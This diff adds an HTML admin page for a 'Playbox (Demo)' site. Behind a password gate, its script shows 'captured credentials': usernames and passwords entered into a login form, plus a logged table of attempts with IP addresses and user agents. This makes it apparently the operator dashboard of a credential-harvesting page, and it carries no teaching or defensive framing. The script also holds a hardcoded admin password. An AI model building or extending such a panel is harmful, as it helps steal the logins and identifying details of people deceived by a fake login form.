@@ -1,0 +1,117 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+    <title>Admin — Playbox (Demo)</title>
+    <link rel="stylesheet" href="styles.css" />
+  </head>
+  <body>
+    <header class="topbar">
+      <div class="container topbar-inner">
+        <a class="brand" href="index.html">
+          <img src="assets/logo.svg" alt="Playbox" />
+          <span>Playbox Admin</span>
+        </a>
+      </div>
+    </header>
+
+    <main style="padding:120px 24px 48px;max-width:900px;margin:0 auto;">
+      <h1>Admin Page (Demo)</h1>
+      <p>This is a local demo admin page. Implement proper authentication before using in production.</p>
+
+      <!-- Admin gate: requires admin password to reveal credentials -->
+      <div id="adminGate" style="margin-top:18px;background:#fff;padding:18px;border-radius:8px;border:1px solid #eee;max-width:420px;">
+        <h2>Administrator Login</h2>
+        <p>Enter the admin password to view captured credentials.</p>
+        <div style="display:flex;gap:8px;margin-top:8px">
+          <input id="adminPass" type="password" placeholder="Admin password" style="flex:1;padding:8px;border:1px solid #ddd;border-radius:6px" />
+          <button id="adminSubmit" style="padding:8px 10px;border-radius:6px;border:1px solid #ddd;background:#eee;cursor:pointer">Enter</button>
+        </div>
+        <p id="adminError" style="color:#b91c1c;margin-top:8px;display:none">Access denied.</p>
+        <p id="adminNote" style="color:#6b7280;margin-top:8px">This will authenticate with the server to fetch attempts.</p>
+      </div>
+
+      <section id="creds" style="margin-top:18px;background:#fff;padding:12px;border-radius:8px;border:1px solid #eee;display:none">
+        <h2>Captured Credentials (demo)</h2>
+        <p id="no-creds">No credentials captured yet. Submit the login form to view them here.</p>
+        <dl id="creds-list" style="display:none;margin:8px 0 0">
+          <dt style="font-weight:700">Username</dt>
+          <dd id="c-user" style="margin:6px 0 12px;color:#111"></dd>
+          <dt style="font-weight:700">Password</dt>
+          <dd id="c-pass" style="margin:6px 0 12px;color:#111;word-break:break-all"></dd>
+        </dl>
+      </section>
+
+      <script>
+        // Admin password gate (demo only). Change ADMIN_PASSWORD as desired.
+        (function(){
+          const ADMIN_PASSWORD = 'admin123'; // demo password
+          const gate = document.getElementById('adminGate');
+          const submit = document.getElementById('adminSubmit');
+          const input = document.getElementById('adminPass');
+          const error = document.getElementById('adminError');
+          const credsSection = document.getElementById('creds');
+          const noCreds = document.getElementById('no-creds');
+          const credsList = document.getElementById('creds-list');
+
+          function reveal(){
+            gate.style.display = 'none';
+            credsSection.style.display = 'block';
+            try{
+              const u = sessionStorage.getItem('demo_user');
+              const p = sessionStorage.getItem('demo_pass');
+              if(u || p){
+                noCreds.style.display = 'none';
+                credsList.style.display = 'block';
+                document.getElementById('c-user').textContent = u || '(empty)';
+                document.getElementById('c-pass').textContent = p || '(empty)';
+              } else {
+                noCreds.style.display = 'block';
+                credsList.style.display = 'none';
+              }
+            }catch(e){ console.error(e); }
+          }
+
+          submit.addEventListener('click', async ()=>{
+            error.style.display = 'none';
+            try{
+              const res = await fetch('/api/admin/login', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ password: input.value }) });
+              if(res.ok){
+                // fetch attempts
+                const j = await (await fetch('/api/admin/attempts')).json();
+                if(j && j.ok){
+                  gate.style.display = 'none';
+                  credsSection.style.display = 'block';
+                  if(j.attempts && j.attempts.length){
+                    noCreds.style.display = 'none';
+                    credsList.style.display = 'block';
+                    // show most recent
+                    const first = j.attempts[0];
+                    document.getElementById('c-user').textContent = first.username || '(empty)';
+                    document.getElementById('c-pass').textContent = first.createdAt || '(time)';
+                    // show table of attempts below
+                    const table = document.createElement('table');
+                    table.style.width='100%';
+                    table.style.marginTop='12px';
+                    table.innerHTML = '<thead><tr><th>User</th><th>IP</th><th>Agent</th><th>When</th></tr></thead>' +
+                      '<tbody>' + j.attempts.map(a=>`<tr><td>${escapeHtml(a.username)}</td><td>${escapeHtml(a.ip||'')}</td><td>${escapeHtml((a.ua||'').slice(0,40))}</td><td>${new Date(a.createdAt).toLocaleString()}</td></tr>`).join('') + '</tbody>';
+                    credsSection.appendChild(table);
+                  } else {
+                    noCreds.style.display = 'block';
+                    credsList.style.display = 'none';
+                  }
+                }
+              } else {
+                error.style.display = 'block';
+              }
+            }catch(e){ error.style.display = 'block'; console.error(e); }
+          });
+
+          input.addEventListener('keydown', (e)=>{ if(e.key === 'Enter') submit.click(); });
+        })();
+        function escapeHtml(s){ return (s||'').replace(/[&<>"']/g, c=>({ '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":"&#39;" })[c]); }
+      </script>
+    </main>
+  </body>
+</html>
